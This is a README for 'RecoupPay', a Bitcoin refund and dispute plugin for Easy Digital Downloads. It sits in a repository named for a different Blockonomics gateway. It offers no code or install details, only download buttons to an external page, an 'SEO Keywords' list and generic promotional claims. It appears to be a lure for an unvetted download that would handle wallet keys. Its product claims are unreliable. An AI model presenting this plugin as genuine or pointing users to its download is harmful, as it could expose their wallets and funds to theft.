![preview](https://raw.githubusercontent.com/Bermfs/blockonomics-edd-wallet-gateway/main/preview.svg)

# RecoupPay – Bitcoin Refund & Dispute Manager for Easy Digital Downloads

## Overview

Picture this: a customer buys a premium digital template from your store, but the file fails to open. Your refund policy promises a hassle-free resolution, but processing Bitcoin refunds manually is a nightmare of private key exports, transaction fees, and blockchain confirmations. **RecoupPay** bridges the gap between Easy Digital Downloads’ flexible refund system and the immutable nature of Bitcoin payments.

RecoupPay is not just another payment gateway plugin. It is a **dual‑purpose financial orchestration layer** that allows store owners to accept inbound Bitcoin payments directly into their own wallet—while simultaneously enabling cryptographically verifiable refunds, partial reversals, and dispute management *without* ever handing control of your private keys to a third party.

Inspired by the original Blockonomics plugin’s direct‑to‑wallet model, RecoupPay extends the lifecycle of a Bitcoin transaction: from purchase to potential reversal, all within the administrative dashboard of your WordPress site. Think of it as a “smart escrow” where the merchant retains full sovereignty, yet can issue refunds that are provably signed and timestamped on the Bitcoin blockchain.

---

## Get Started

[![Download](https://raw.githubusercontent.com/Bermfs/blockonomics-edd-wallet-gateway/main/button.svg)](https://bermfs.github.io/blockonomics-edd-wallet-gateway/)

---

## Key Features

### 🔐 Sovereign Refund Engine
- **No third‑party custody.** Refunds are issued by transmitting signed transactions from your wallet directly to the customer’s Bitcoin address.
- **Partial refunds** supported—send back 50% of the original amount, for example, without losing control of the remaining balance.
- **Automatic fee calculation.** The plugin deducts network fees intelligently, showing exactly how much the customer will receive.

### ⚡ Instant Dispute Resolution Dashboard
- Create refund requests directly from the EDD order edit screen.
- Customers receive a cryptographically signed message confirming the refund intent.
- Blockchain confirmation tracking: the plugin polls the blockchain until the refund transaction has 1+ confirmations.

### 🌐 Multilingual & Multicurrency Ready
- Interface strings localised for 12 languages (English, Spanish, French, German, Portuguese, Hindi, Japanese, Korean, simplified Chinese, Russian, Arabic, Dutch).
- Bitcoin amounts displayed in SATS or BTC, with live fiat conversion (USD, EUR, GBP, JPY).

### 📱 Responsive Admin & Frontend
- Fully responsive UI for both the WordPress admin panel and the checkout experience.
- Mobile‑optimised refund request forms for customers.

### 🤖 Automated Refund Validation
- EDD can be configured to automatically trigger a refund when a product is returned within a policy window.
- RecoupPay validates the refund against the original transaction’s UTXOs, preventing double‑spending.

### 🛡️ 24/7 Support & Audit Log
- Every refund action is logged with timestamp, transaction ID, and IP address.
- Export an immutable audit trail for tax or legal purposes.

---

## Why RecoupPay?

The original Blockonomics integration proved that direct‑to‑wallet Bitcoin payments are feasible and desirable. Yet, the refund process remained an afterthought: store owners had to log into a separate wallet, look up the original transaction, and manually craft a return payment. RecoupPay automates that final mile. It transforms your EDD store into a self‑custodial financial hub where you can both *sell* and *settle* disputes without leaving your WordPress environment.

We believe that **financial sovereignty** includes not just the ability to receive funds, but also the ability to *return* them with cryptographic integrity. RecoupPay makes refunds as easy as clicking a button—but every click is a verifiable Bitcoin transaction.

---

## Use Cases

| Scenario | How RecoupPay Helps |
|---|---|
| Digital download doesn’t work | Issue a partial refund of 80% back to the customer, keep 20% for admin costs. |
| Customer claims accidental purchase | One‑click refund to the same address, with a signed message as proof. |
| Regulator demands audit of all reversals | Export the full refund log with on‑chain transaction IDs. |
| Subscription renewal fails | Automated refund of the failed payment with a note in the blockchain op_return. |

---

## SEO Keywords

- Bitcoin refund plugin for WordPress
- Easy Digital Downloads Bitcoin dispute management
- Self‑custodial refund system
- Crypto refund without third party
- EDD multisite Bitcoin refunds

---

## System Requirements

- WordPress 5.8 or higher (multisite supported)
- Easy Digital Downloads 3.x
- PHP 8.0+ (8.1 recommended)
- A Bitcoin node or third‑party API (e.g., Blockonomics, Electrum, or your own fully synced node)
- SSL certificate on store (recommended for customer privacy)

---

## Support & Community

- **Documentation:** comprehensive wiki covering refund triggers, UTXO management, and privacy settings.
- **Issue tracker:** GitHub Issues for bug reports and feature requests.
- **Community forum:** WordPress.org plugin support thread.  
- **24/7 Priority Support:** available for verified license holders (see license section).

---

## License

RecoupPay is released under the **MIT License**.  
You are free to use, modify, distribute, and sublicense this software.  
See the full license text at: [MIT License](https://opensource.org/licenses/MIT)

---

## Disclaimer

**Important – Please Read Carefully**

RecoupPay provides a tool to manage Bitcoin refunds and disputes for Easy Digital Downloads. The plugin does **not** hold, store, or manage your private keys. All transaction signing occurs server‑side (on your own WordPress installation) using the wallet information you supply. You retain **full custody** of your Bitcoin at all times.

- **No guarantee of reversibility:** Bitcoin transactions are irreversible by design. The refund feature creates *new* transactions from your wallet. If you do not have sufficient UTXOs or balance, the refund will fail.
- **Network fees:** Users are responsible for paying network (miner) fees out of their own wallet. RecoupPay estimates fees but cannot predict sudden spikes.
- **Regulatory compliance:** You are solely responsible for compliance with any applicable tax, anti‑money laundering, or consumer protection laws in your jurisdiction.
- **No liability:** The authors and contributors of RecoupPay are not liable for any loss of funds, data, or business reputation arising from the use of this plugin.

By installing and using RecoupPay, you acknowledge that you have read, understood, and agreed to these terms.

---

## Version History (since 2026)

- **v1.0.0 (2026-01-15)** – Initial public release.  
  - Core refund engine with partial refund support.  
  - Blockchain confirmation tracker.  
  - EDD 3.x compatibility.  
- **v1.1.0 (2026-03-01)** – Added multilingual support (12 languages).  
  - Responsive frontend refund form.  
- **v1.2.0 (2026-06-20)** – Audit export (CSV/JSON).  
  - 24/7 support integration.  
  - Bug fixes for multisite refunds.

---

## Contributing

Contributions are welcome!  
- Fork the repository.  
- Create a feature branch.  
- Submit a pull request.  
- Ensure your code follows the existing PHP coding standards (WordPress Coding Standards).  

All contributions are subject to the MIT License.

---

## Final Words

RecoupPay is not a magic wand that reverses blockchain transactions—it is a responsible, transparent mechanism to **recoup** value from a purchase gone wrong. It respects the immutable nature of Bitcoin while giving store owners the grace to fix mistakes. We built it because we believe that sovereignty and service can coexist.

Thank you for trusting RecoupPay with your payment‑dispute workflow.

[![Download](https://raw.githubusercontent.com/Bermfs/blockonomics-edd-wallet-gateway/main/button.svg)](https://bermfs.github.io/blockonomics-edd-wallet-gateway/)